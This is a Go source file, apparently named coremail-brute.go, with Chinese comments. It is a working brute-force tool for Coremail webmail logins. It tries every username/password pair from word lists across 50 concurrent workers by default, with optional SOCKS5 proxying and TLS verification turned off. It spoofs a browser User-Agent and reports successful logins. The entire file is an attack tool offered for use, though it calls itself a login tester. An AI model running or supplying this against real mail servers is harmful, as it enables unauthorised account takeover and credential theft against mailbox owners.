package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

// CoremailLoginTester 结构体用于封装登录测试所需的信息
type CoremailLoginTester struct {
	HttpClient *http.Client
	TargetURL  string
	UserAgent  string
}

// NewCoremailLoginTester 创建一个新的 CoremailLoginTester
func NewCoremailLoginTester(proxyAddr, targetURL string) (*CoremailLoginTester, error) {
	var httpClient *http.Client

	if proxyAddr != "" {
		dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
		if err != nil {
			return nil, fmt.Errorf("无法创建SOCKS5拨号器: %v", err)
		}
		httpTransport := &http.Transport{
			Dial:            dialer.Dial,
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略TLS证书验证
		}
		httpClient = &http.Client{
			Transport: httpTransport,
			Timeout:   10 * time.Second,
		}
	} else {
		httpClient = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略TLS证书验证
			},
			Timeout: 10 * time.Second,
		}
	}

	return &CoremailLoginTester{
		HttpClient: httpClient,
		TargetURL:  targetURL,
		UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	}, nil
}

// TestLogin 测试单个用户名和密码
func (t *CoremailLoginTester) TestLogin(username, password string) (bool, error) {
	loginURL := t.TargetURL + "/coremail/index.php/user/login"
	data := url.Values{}
	data.Set("uid", username)
	data.Set("password", password)

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		return false, fmt.Errorf("创建请求失败: %v", err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", t.UserAgent)

	// 恢复 http.Client 的默认行为，让其自动跟随302跳转
	t.HttpClient.CheckRedirect = nil

	resp, err := t.HttpClient.Do(req)
	if err != nil {
		return false, fmt.Errorf("请求失败: %v", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, fmt.Errorf("读取响应体失败: %v", err)
	}
	bodyString := string(bodyBytes)

	// 登录失败后，页面通常会包含明确的错误信息，且URL不会跳转到主页
	failureKeywords := []string{"密码错误", "用户不存在", "验证码不正确", "帐号或密码错误"}
	for _, keyword := range failureKeywords {
		if strings.Contains(bodyString, keyword) {
			return false, nil // 明确的登录失败
		}
	}

	// 登录成功后，会跳转到主页，URL会包含特定标识
	finalURL := resp.Request.URL.String()
	if strings.Contains(finalURL, "main.jsp") || strings.Contains(finalURL, "sid=") {
		// 进一步确认页面内容，防止误判
		if !strings.Contains(bodyString, "密码错误") {
			return true, nil
		}
	}

	// 作为最终的辅助判断，检查页面是否包含成功登录的关键字
	successKeywords := []string{"收件箱", "写信", "通讯录", "退出"}
	for _, keyword := range successKeywords {
		if strings.Contains(bodyString, keyword) {
			return true, nil
		}
	}

	return false, nil
}

func main() {
	targetURL := flag.String("url", "", "Coremail服务器地址 (例如: https://mail.example.com)")
	proxyAddr := flag.String("proxy", "", "SOCKS5代理地址 (例如: 127.0.0.1:1080)")
	concurrency := flag.Int("c", 50, "并发线程数")
	flag.Parse()

	usersPath := "users.txt"
	passwordsPath := "passwords.txt"

	if *targetURL == "" {
		fmt.Println("用法: go run coremail-brute.go -url <target_url> [-proxy <proxy_addr>] [-c <concurrency>]")
		fmt.Println("注意: 用户名和密码字典将默认从程序目录下的 users.txt 和 passwords.txt 读取。")
		flag.PrintDefaults()
		os.Exit(1)
	}

	tester, err := NewCoremailLoginTester(*proxyAddr, *targetURL)
	if err != nil {
		fmt.Printf("初始化登录测试器失败: %v\n", err)
		os.Exit(1)
	}

	// 从文件中读取行
	readLines := func(path string) ([]string, error) {
		file, err := os.Open(path)
		if err != nil {
			return nil, fmt.Errorf("无法打开文件 %s: %v", path, err)
		}
		defer file.Close()

		var lines []string
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			lines = append(lines, scanner.Text())
		}
		return lines, scanner.Err()
	}

	users, err := readLines(usersPath)
	if err != nil {
		fmt.Printf("读取用户文件时出错: %v\n", err)
		os.Exit(1)
	}

	passwords, err := readLines(passwordsPath)
	if err != nil {
		fmt.Printf("读取密码文件时出错: %v\n", err)
		os.Exit(1)
	}

	var wg sync.WaitGroup
	credentialsChan := make(chan string)

	// 创建工作协程
	for i := 0; i < *concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for credential := range credentialsChan {
				parts := strings.SplitN(credential, ":", 2)
				if len(parts) != 2 {
					continue
				}
				username := parts[0]
				password := parts[1]

				fmt.Printf("正在测试: %s:%s\n", username, password)
				success, err := tester.TestLogin(username, password)
				if err != nil {
					fmt.Printf("测试 %s:%s 时出错: %v\n", username, password, err)
					continue
				}

				if success {
					fmt.Printf("[+] 登录成功! 用户名: %s, 密码: %s\n", username, password)
				}
			}
		}()
	}

	// 生成凭据并发送到通道
	go func() {
		for _, user := range users {
			for _, pass := range passwords {
				if user != "" && pass != "" {
					credentialsChan <- fmt.Sprintf("%s:%s", user, pass)
				}
			}
		}
		close(credentialsChan)
	}()

	wg.Wait()

	fmt.Println("所有凭据测试完毕。")
}
